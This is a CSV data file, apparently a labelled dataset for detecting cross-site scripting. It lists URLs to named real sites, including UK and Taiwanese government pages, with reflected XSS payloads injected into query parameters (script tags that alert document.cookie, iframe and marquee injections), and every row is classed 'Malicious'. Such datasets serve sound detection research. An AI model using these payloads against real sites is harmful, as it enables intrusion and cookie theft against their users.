Payloads,Class
http://www.manchester.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.<br>cookie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0,Malicious
http://www.northwarks.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.<br>cookie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0,Malicious
http://www.chaoticwars.co.uk/register.php?ref='%3e%3ciframe%20src=http://google.com%3e,Malicious
http://walkmyplank.net/signup.php?ref=%22%3e%3ciframe%20src=http://google.com%3e%3cfont%20color=red%<br>3e,Malicious
https://www.scriptlance.com/cgi-bin/freelancers/search.cgi?cats=36&quot;&gt;a&lt;/a&gt;&lt;marquee&gt;pappy was<br>here&lt;/marquee&gt;,Malicious
http://www.harrow.gov.uk/site/scripts/google_results.php?q=%22%3e%253cscript%3ealert%28document.cook<br>ie%29%3b%253c%2fscript%3e&amp;btng=search&amp;ie=&amp;site=&amp;output=xml&amp;client=&amp;lr=&amp;oe=&amp;filter=0,Malicious
http://visualarts.qld.gov.au/designyourowntour/register.php?user=found&amp;message=username%20already%20<br>exists%20in%20database&amp;requsername=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=%22%3e%3cscript%3ealert(documen<br>t.cookie);%3c/script%3e,Malicious
http://www.memorec.ru/register.php?sesid=blah'%3etest%3c/a%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,Malicious
http://webindex.giggog.com/search.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fs<br>cript%3e,Malicious
http://tiempo.meteored.com/buscar.php?criterio=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.lugu.gov.tw/4images/register.php?sessionid=&quot;&gt;&lt;iframe src=http://google.com&gt;&lt;!--,Malicious
http://www.netstumbler.org/f55/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://board.jokeroo.com/announcements/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://medical-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cook<br>ie)%3b%3c%2fscript%3e,Malicious
http://idioms.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cookie)%3b%3c%2f<br>script%3e,Malicious
